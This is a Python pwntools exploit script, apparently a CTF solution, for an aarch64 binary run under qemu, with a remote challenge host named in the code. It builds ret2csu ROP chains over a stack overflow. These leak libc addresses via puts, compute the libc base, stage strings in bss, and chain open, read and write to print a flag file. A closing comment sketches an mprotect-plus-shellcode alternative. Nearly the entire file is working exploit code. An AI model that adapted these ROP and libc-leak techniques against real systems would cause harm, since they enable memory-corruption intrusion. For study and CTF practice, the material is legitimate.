#! /usr/bin/env python
# -*- coding: utf-8 -*-
#
# Copyright © 2019 vam <jpwan21@gmail.com>

from pwn import *
context.log_level="debug"
context.arch = "aarch64"
#pwn_file="./"
#elf=ELF(pwn_file)
pwn_file="sudo chroot ./ ./qemu-aarch64-static -g 1234 ./chall"
#pwn_file="sudo chroot ./ ./qemu-aarch64-static  ./chall"
libc=ELF("./libc-2.23.so")
#heap_add=0
#stack_add=0
if len(sys.argv)==1:
	r=process(pwn_file, shell=True)
else:
    r=remote("pwn.sixstars.team", 23612)
    pid=0

def debug():
    log.debug("process pid:%d"%pid)
    pause()


def getcsu_arm(pre_addr, loop_addr, rbx,rbp, func_addr,rdx,rsi, rdi, ret_addr):
    csu = p64(pre_addr) + p64(0) + p64(loop_addr) +p64(rbx) + p64(rbp) + p64(func_addr)+p64(rdx)+p64(rsi)+p64(rdi)\
    + p64(0) + p64(ret_addr) + p64(0)*6
    return csu

csu_start = 0x400864
csu_func = 0x400844
wrapper = 0x400750
puts_got = 0x411020
libc_start_main_got = 0x411008
ldp_ret = 0x400870
bss  = 0x411800
read_got = 0x411028
main = 0x400790

csu0 = getcsu_arm(csu_start, csu_func, 0, 1, puts_got,0,0,libc_start_main_got, main)
payload0 = 'a'*0x18 + csu0

r.recvuntil("Give me your rop chain: ")
r.sendline(payload0)
r.recvline()
w = r.recv(3)
w = u64(w+'\x00'*5)
low = w - libc.sym['__libc_start_main']
print hex(low)

csu = getcsu_arm(csu_start, csu_func, 0, 1, puts_got,0,0,libc_start_main_got+4, main)
payload = 'a'*0x18 + csu

r.recvuntil("Give me your rop chain: ")
r.sendline(payload)
r.recvline()

w = r.recv(1)
w = u64(w+'\x00'*7)
high = w

libc.address = high*0x100000000 + low
print hex(libc.address)
#system = libc.sym['system']
#binsh = list(libc.search('/bin/sh'))[0]
#print hex(system)
#print hex(binsh)

csu2 =getcsu_arm(csu_start, csu_func, 0, 1, read_got,100,bss,0, main)
payload2 = 'a'*0x18 + csu2

r.recvuntil("Give me your rop chain: ")
r.sendline(payload2)

# 上传用到的字符串
input_str = p64(libc.sym['open']) + "./flag\x00\x00" + p64(libc.sym['write']) # +  p64(system)+"/bin/sh\x00"
r.sendline(input_str)

open_pos = bss
filename = bss+8
csu3 = getcsu_arm(csu_start, csu_func, 0, 1, open_pos, 4, 0, filename, main)
payload3 = 'a'*0x18 + csu3
r.recvuntil("Give me your rop chain: ")
r.sendline(payload3)


bss2 =  0x411800 + 0x100
csu4 = getcsu_arm(csu_start, csu_func, 0, 1, read_got, 100, bss2, 3, main)
payload4 = 'a'*0x18 + csu4
r.recvuntil("Give me your rop chain: ")
r.sendline(payload4)

write_pos = bss+8+8
csu5 = getcsu_arm(csu_start, csu_func, 0, 1, write_pos, 100, bss2, 1, main)
payload5 = 'a'*0x18 + csu5[:-0x40]
r.recvuntil("Give me your rop chain: ")
r.sendline(payload5)

w = r.recvline()
w = r.recvline()
print w

r.interactive()
'''
# share文件夹下chroot， 因此share就是root，其中没有/bin/sh 命令
方法1：
csu1：mprotect 开权限
csu2：写读的shellcode，编译，读入，跳转
方法2：
open + read + write
'''
